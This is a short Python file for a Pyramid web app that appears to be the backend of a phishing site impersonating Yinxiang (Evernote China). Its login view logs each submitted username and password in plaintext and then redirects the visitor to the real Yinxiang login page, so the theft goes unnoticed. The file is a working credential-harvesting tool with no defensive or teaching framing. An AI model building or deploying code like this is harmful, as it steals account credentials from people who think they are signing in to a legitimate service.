import logging

from pyramid.view import view_config
from pyramid.httpexceptions import HTTPFound


#logging.basicConfig(
#                    # filename=logname,
#                    filemode='a',
#                    format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
#                    datefmt='%H:%M:%S',
#                    level=logging.DEBUG)
logger = logging.getLogger(__name__)


@view_config(route_name='home', renderer='templates/mytemplate.pt')
def my_view(request):
    return {'project': 'yxbj'}

@view_config(route_name='login', renderer='templates/login.pt')
def login_view(request):
    if request.POST.get('username') and request.POST.get('password'):
        logger.info('='*80)
        logger.info('-'*80)
        logger.info('username: ' + request.POST.get('username'))
        logger.info('password: ' + request.POST.get('password'))
        logger.info('-'*80)
        logger.info('='*80)
        return HTTPFound(location='https://app.yinxiang.com/Login.action?targetUrl=%2FHome.action%3Foffer%3Dwww_menu')
    return {'project': 'yxbj'}
